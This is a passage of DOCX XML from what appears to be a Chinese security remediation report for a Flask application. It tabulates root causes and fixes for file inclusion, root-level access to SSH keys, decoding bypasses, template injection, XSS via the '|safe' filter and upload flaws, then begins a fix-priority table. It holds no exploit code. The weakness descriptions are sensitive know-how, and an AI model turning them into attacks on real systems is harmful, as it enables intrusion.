              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 11</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>用户 ID 归属校验</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>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已阻断</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>⑦ 资金篡改</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 11</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>session 取 user_id + 金额校验</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>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已阻断</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="160"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>四、漏洞根因分析</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667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞编号</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>根因</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>风险分析</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>无输入校验</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>：name 参数直接拼接到文件路径</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>白名单是最根本的修复，从源头切断所有文件读取</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>权限过大</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>：应用以 root 运行，可读取 /root/.ssh</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>即使修复 LFI，也应改为非 root 运行</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>多层解码</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>：Flask URL 解码 + 系统文件路径解码</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>白名单不依赖输入校验，编码绕过无效</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>渲染无沙箱</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>：日志内容直接传给 Jinja2 模板</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Bleach 清洗 + 移除 \</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>safe 双重防御</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>缺乏纵深防御</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>：单点漏洞导致全链路沦陷</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>每层独立防御，单一穿透不影响后续</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>前端模板不安全</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>：`\</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>safe` 禁用 HTML 转义</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>后端清洗 + 前端自动转义</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 7</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>路由无认证</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>：与 /search、/upload 不一致</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>统一增加 session 校验</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>文件名未处理</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>：直接使用用户提供的文件名</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>UUID 重命名是业界最佳实践</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 9</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>内容未检测</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>：仅校验扩展名忽略内容</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Magic Number 检测文件真实类型</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>静态目录无保护</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>：Flask 默认行为</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>添加安全响应头</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="160"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>五、修复优先级</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>5.1 P0～P2 修复优先级别表</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shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>优先级</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞编号</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞名称</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>修复内容</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>预估耗时</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
